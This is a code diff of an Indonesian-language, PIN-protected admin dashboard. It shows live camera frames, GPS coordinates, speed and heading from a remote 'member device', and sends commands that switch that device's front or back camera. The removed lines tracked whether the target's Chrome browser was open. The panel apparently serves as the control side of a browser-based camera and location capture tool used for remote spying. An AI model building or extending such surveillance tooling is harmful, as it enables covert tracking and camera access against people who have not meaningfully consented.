@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Kamera Depan/Belakang & Lokasi</title>
+    <title>Admin Panel - Kamera Depan & Belakang</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
@@ -57,28 +57,53 @@
 
         .section-title { font-size: 16px; margin-bottom: 12px; color: #e2e8f0; }
 
-        .status-card {
+        .call-stage {
             background: #1e293b; border: 1px solid #334155;
-            border-radius: 12px; padding: 16px; margin-bottom: 22px;
+            border-radius: 14px; padding: 16px; margin-bottom: 24px;
+        }
+        .call-screen {
+            position: relative;
+            width: 100%;
+            max-width: 520px;
+            aspect-ratio: 4 / 3;
+            margin: 0 auto 14px;
+            background: #020617;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #334155;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .call-screen img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .call-overlay-top {
+            position: absolute; top: 10px; left: 10px; right: 10px;
             display: flex; justify-content: space-between; align-items: center;
-            flex-wrap: wrap; gap: 14px;
+            pointer-events: none; gap: 8px;
         }
-        .status-card h3 { font-size: 15px; color: #fff; margin-bottom: 5px; }
-        .status-card p { font-size: 12px; color: #94a3b8; margin-bottom: 3px; }
-        .badge-online {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
-            background: rgba(34, 197, 94, 0.2); color: #4ade80; margin-left: 6px;
+        .tag-live {
+            background: rgba(239, 68, 68, 0.9); color: #fff;
+            font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
         }
-        .badge-closed {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
-            background: rgba(148, 163, 184, 0.2); color: #cbd5e1; margin-left: 6px;
+        .tag-cam {
+            background: rgba(99, 102, 241, 0.9); color: #fff;
+            font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
         }
-
-        .cmd-panel {
-            background: #1e293b; border: 1px solid #334155;
-            border-radius: 12px; padding: 16px; margin-bottom: 24px;
+        .tag-age {
+            background: rgba(15, 23, 42, 0.78); color: #e2e8f0;
+            font-size: 11px; padding: 4px 10px; border-radius: 999px;
         }
-        .cmd-panel h2 { font-size: 15px; margin-bottom: 10px; }
+        .call-meta {
+            background: #0f172a; border: 1px solid #334155;
+            border-radius: 10px; padding: 12px; margin-bottom: 12px;
+            font-size: 12px; color: #cbd5e1;
+            display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 10px;
+        }
         .cmd-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
         .cmd-status { font-size: 12px; color: #94a3b8; margin-top: 10px; }
 
@@ -129,7 +154,7 @@
     <div id="dashboard">
         <div class="header">
             <div>
-                <h1>📍📷 Kontrol Kamera Depan/Belakang & Log</h1>
+                <h1>📹 Pantau Kamera Depan/Belakang & Lokasi</h1>
                 <div class="live-pill"><span class="dot"></span> Auto-Sync (tiap 3d) • Total Log: <span id="totalCount">0</span></div>
             </div>
             <div class="actions">
@@ -138,13 +163,27 @@
             </div>
         </div>
 
-        <h2 class="section-title">🛰️ Status Sesi & Pergerakan Lokasi</h2>
-        <div id="sessionContainer" class="live-grid">
-            <div class="empty-state">Menunggu sesi aktif...</div>
-        </div>
+        <h2 class="section-title">📺 Layar Pantau Kamera (Depan / Belakang)</h2>
+        <div class="call-stage">
+            <div class="call-screen">
+                <div class="call-overlay-top">
+                    <div style="display:flex;gap:6px;">
+                        <span class="tag-live" id="liveBadge">MENUNGGU</span>
+                        <span class="tag-cam" id="camBadge">KAMERA: -</span>
+                    </div>
+                    <span class="tag-age" id="ageBadge">-</span>
+                </div>
+                <img id="liveFrameImg" src="" alt="Live Camera" style="display:none;">
+                <span id="livePlaceholder" style="color:#64748b;font-size:13px;">Menunggu kamera & lokasi dari perangkat member...</span>
+            </div>
 
-        <div class="cmd-panel">
-            <h2>Kontrol Kamera & Pengambilan dari Admin</h2>
+            <div class="call-meta">
+                <div id="liveLocInfo">
+                    <strong>Lokasi:</strong> Belum ada data • <strong>Kecepatan:</strong> - • <strong>Arah:</strong> -
+                </div>
+                <div id="liveMapAction"></div>
+            </div>
+
             <div class="cmd-row">
                 <button class="btn-cam" onclick="sendCommand('SWITCH_CAM', 'user')">🤳 Kamera Depan</button>
                 <button class="btn-cam" onclick="sendCommand('SWITCH_CAM', 'environment')">📷 Kamera Belakang</button>
@@ -169,6 +208,7 @@
 
     let syncTimer = null;
     let isFetching = false;
+    let lastRenderedFrame = "";
     let lastRenderedLogCount = -1;
 
     function checkPin() {
@@ -228,38 +268,59 @@
         }
     }
 
-    function renderSessions(liveSessions) {
-        const container = document.getElementById('sessionContainer');
+    function renderLiveStage(liveSessions) {
         const list = Object.values(liveSessions || {})
-            .filter(item => item && item.lat !== null && item.lng !== null)
+            .filter(item => item && (item.frame || (item.lat !== null && item.lng !== null)))
             .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
 
+        const imgEl = document.getElementById('liveFrameImg');
+        const phEl = document.getElementById('livePlaceholder');
+        const liveBadge = document.getElementById('liveBadge');
+        const camBadge = document.getElementById('camBadge');
+        const ageBadge = document.getElementById('ageBadge');
+        const locInfo = document.getElementById('liveLocInfo');
+        const mapAction = document.getElementById('liveMapAction');
+
         if (list.length === 0) {
-            container.innerHTML = '<div class="empty-state">Belum ada sesi perangkat.</div>';
+            imgEl.style.display = "none";
+            phEl.style.display = "block";
+            liveBadge.textContent = "MENUNGGU";
+            camBadge.textContent = "KAMERA: -";
+            ageBadge.textContent = "-";
+            locInfo.innerHTML = "<strong>Lokasi:</strong> Belum ada data • <strong>Kecepatan:</strong> - • <strong>Arah:</strong> -";
+            mapAction.innerHTML = "";
             return;
         }
 
-        const latest = list[0];
-        const ageSec = latest.updatedAt ? Math.max(0, Math.round((Date.now() - latest.updatedAt) / 1000)) : null;
-        const isOpen = ageSec !== null && ageSec <= 10;
-        const camPos = escapeHtml(latest.kameraPosisi || "Depan");
+        const active = list[0];
+        const ageSec = active.updatedAt ? Math.max(0, Math.round((Date.now() - active.updatedAt) / 1000)) : null;
+        const isFresh = ageSec !== null && ageSec <= 10;
 
-        const statusBadge = isOpen
-            ? `<span class="badge-online">Chrome Terbuka • Kamera ${latest.kameraAktif ? camPos : "Nonaktif"}</span>`
-            : `<span class="badge-closed">Chrome Ditutup / Tidak Aktif (${ageSec ?? "-"}d lalu)</span>`;
+        liveBadge.textContent = isFresh ? "AKTIF" : "TERAKHIR";
+        camBadge.textContent = `KAMERA: ${String(active.kameraPosisi || "Depan").toUpperCase()}`;
+        ageBadge.textContent = ageSec !== null ? `Update ${ageSec}d lalu` : (active.waktu || "-");
 
-        container.innerHTML = `
-            <div class="status-card" style="margin-bottom:22px;">
-                <div>
-                    <h3>${escapeHtml(latest.nama || "HP Saya")} ${statusBadge}</h3>
-                    <p>🌐 <strong>Koordinat:</strong> ${latest.lat}, ${latest.lng} • <strong>Akurasi:</strong> ${escapeHtml(latest.akurasi || "-")}</p>
-                    <p>🧭 <strong>Kecepatan:</strong> ${escapeHtml(latest.kecepatan || "-")} • <strong>Arah:</strong> ${escapeHtml(latest.arah || "-")} • <strong>Update:</strong> ${escapeHtml(latest.waktu || "-")}</p>
-                </div>
-                <div>
-                    <a class="btn-map" href="https://www.google.com/maps?q=${latest.lat},${latest.lng}" target="_blank">Buka di Google Maps ↗</a>
-                </div>
-            </div>
+        if (typeof active.frame === "string" && active.frame.startsWith("data:image/")) {
+            if (active.frame !== lastRenderedFrame) {
+                lastRenderedFrame = active.frame;
+                imgEl.src = active.frame;
+            }
+            imgEl.style.display = "block";
+            phEl.style.display = "none";
+        } else {
+            imgEl.style.display = "none";
+            phEl.style.display = "block";
+        }
+
+        const hasCoords = active.lat !== null && active.lat !== undefined && active.lng !== null && active.lng !== undefined;
+        locInfo.innerHTML = `
+            <strong>Lokasi:</strong> ${hasCoords ? `${active.lat}, ${active.lng}` : "Tidak ada"} (${escapeHtml(active.akurasi || "-")}) •
+            <strong>Kecepatan:</strong> ${escapeHtml(active.kecepatan || "-")} •
+            <strong>Arah:</strong> ${escapeHtml(active.arah || "-")}
         `;
+        mapAction.innerHTML = hasCoords
+            ? `<a class="btn-map" href="https://www.google.com/maps?q=${active.lat},${active.lng}" target="_blank">Buka Maps ↗</a>`
+            : "";
     }
 
     function renderLogs(logs, forceRender) {
@@ -330,11 +391,11 @@
             if (!res.ok) throw new Error("Gagal mengambil data");
 
             const data = await res.json();
-            renderSessions(data.liveSessions || {});
+            renderLiveStage(data.liveSessions || {});
             renderLogs(Array.isArray(data.logs) ? data.logs : [], forceRender);
         } catch (err) {
             if (forceRender) {
-                document.getElementById('sessionContainer').innerHTML = '<div class="empty-state" style="color:#f87171;">Gagal menyinkronkan data.</div>';
+                document.getElementById('livePlaceholder').textContent = "Gagal menyinkronkan data.";
             }
             console.error(err);
         } finally {
